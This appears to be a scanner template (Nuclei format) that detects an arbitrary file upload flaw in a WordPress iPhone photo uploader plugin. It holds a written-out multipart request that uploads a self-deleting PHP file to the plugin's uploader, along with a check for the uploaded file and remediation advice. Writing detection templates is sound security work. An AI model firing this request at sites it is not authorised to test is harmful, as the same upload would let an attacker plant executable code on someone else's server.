id: Wordpress-Windows_Desktop_and_iPhone_Photo_Uploader_Plugins-FileUpload
info:
  name: WordPress Windows Desktop and iPhone Photo Uploader Plugin Arbitrary File Upload Vulnerability
  author:
  - l0ne1y
  description: |-
    WordPress Plugin Windows Desktop and iPhone Photo Uploader Arbitrary File Upload Vulnerability
    WordPress is a blogging platform developed by the WordPress Foundation using the PHP language. The platform supports setting up personal blog websites on PHP and MySQL servers. WordPress plugin is an open source application plug-in for WordPress.

    The WordPress plugin Windows Desktop and iPhone Photo Uploader has a security vulnerability due to insufficient input file type validation in the wp-content/plugins/i-dump-iphone-to-wordpress-photo-uploader/uploader.php file.
  severity: critical
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: https://wordpress.org/plugins/

    Temporary fix:
    File upload:
    1. The server side directly sets the file upload directory to non-executable.
    2. File type check: It is recommended to use the whitelist method (more reliable than the blacklist), combined with MIME Type, suffix check and other methods (the file type is restricted by the whitelist). In addition, you can use the compression function or resize function to process images, which will destroy the HTML code they contain while processing the image.
    3. Use random numbers to rewrite file names and file paths so that users cannot easily access their uploaded files.
    4. Set the domain name of the file server separately.
    5. Verify the file content and use regular rules to match malicious code (filter various bypass methods of malicious code, such as upper and lower case, BASE64 encoding) to limit uploading.
    6. Fix possible parsing vulnerabilities in the server.
    7. Strictly restrict the upload of files that can modify the server configuration, such as: .htaccess.
    8. Hide the upload file path.
    9. Upgrade Web Server.
    10. Fix the Web upload code in a timely manner.
    11. There cannot be any local files containing vulnerabilities.
    12. Pay attention to 0x00 truncation attack (update PHP to the latest version).
requests:
- extractors:
  - name: shell
    type: regex
    regex:
    - '/thumbnails/(.*?)\ '
    group: 1
    part: body
    internal: true
  raw:
  - |
    POST /wp-content/plugins/i-dump-iphone-to-wordpress-photo-uploader/uploader.php HTTP/1.1
    Host: {{Host}}
    Content-Length: 354
    Cache-Control: max-age=0
    Origin: null
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhlxhkQpw03vLv502
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8

    Connection: close

    ------WebKitFormBoundaryhlxhkQpw03vLv502
    Content-Disposition: form-data; name="file"; filename="233.php"
    Content-Type: application/octet-stream

    <?php echo md5(233);unlink(__FILE__);?>
    ------WebKitFormBoundaryhlxhkQpw03vLv502
    Content-Disposition: form-data; name="upload"

    ------WebKitFormBoundaryhlxhkQpw03vLv502--
- matchers:
  - type: dsl
    dsl:
    - status_code==200 && contains(body,"e165421110ba03099a1c0393373c5b43")
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/uploads/i-dump-uploads/{{shell}}'
  method: GET
